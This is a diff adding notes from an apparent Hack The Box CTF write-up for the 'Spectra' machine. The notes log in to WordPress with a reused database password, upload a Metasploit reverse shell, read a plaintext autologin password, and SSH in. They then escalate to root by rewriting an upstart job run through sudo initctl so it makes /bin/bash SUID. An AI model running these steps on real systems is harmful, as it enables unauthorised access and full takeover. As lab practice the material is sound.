@@ -56,4 +56,72 @@ define( 'DB_PASSWORD', 'devteam01' );
 define( 'DB_HOST', 'localhost' );
 
 Try to login on http://spectra.htb/main/wp-login.php using administrator : devteam01. This is successful.
+Uploading a reverse shell
+└─# msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+/bin/sh -i
+$ cd autologin
+$ pwd
+/etc/autologin
+$ ls
+passwd
+$ cat passwd
+SummerHereWeCome!!
 
+Trying to ssh as katie:
+ssh katie@10.10.10.229 : SummerHereWeCome!!
+katie@spectra ~ $ id
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+katie@spectra ~ $ ls
+log  user.txt
+katie@spectra ~ $ cat user.txt 
+e89d27fe195e9114ffa72ba8913a6130
+
+==========Priv Escalation=====================
+katie@spectra ~/log $ sudo -l
+User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+----------------------------------------------
+katie@spectra /etc/init $ cat test.conf
+description "Test node.js server"
+author      "katie"
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+
+    export HOME="/srv"
+    echo $$ > /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
+end script
+--------------------------------------
+Modified script
+katie@spectra /tmp $ cat test4
+katie@spectra /etc/init $ cat test.conf
+description "Test node.js server"
+author      "katie"
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+
+    chmod +s /bin/bash
+
+end script
+
+Reference at : https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9
+
+sudo /sbin/inictl start test
+/bin/bash -p
+Root flag : d44519713b889d5e1f9e536d0c6df2fc
